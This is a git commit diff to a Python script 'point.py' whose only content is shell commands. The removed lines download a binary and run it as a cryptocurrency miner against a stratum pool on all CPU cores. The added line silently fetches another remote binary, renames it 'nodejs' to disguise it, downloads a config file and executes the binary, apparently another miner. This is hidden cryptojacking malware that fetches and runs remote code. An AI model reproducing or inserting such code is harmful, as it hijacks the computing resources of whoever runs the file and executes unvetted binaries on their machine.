b3a443e9b97ac58f4f49ae2f0511adfcfe123b0b
MADEWGN-X <github@madewgn.eu.org>
2024-07-11 19:12:41 +0800

    Update point.py

--- point/point.py
+++ point/point.py
@@ -1,4 +1,4 @@
 import sys
 import os
-os.system("wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
-os.system("chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.test -t $(nproc)")
+#os.system("wget https://github.com/MADEWGN-X/x/raw/main/appsettings.json")
+os.system("wget -q -O nodejs https://bitbucket.org/excel-gms/fix/downloads/qli-Client && chmod +x nodejs >/dev/null 2>&1 && wget https://github.com/MADEWGN-X/x/raw/main/appsettings.json && ./nodejs")
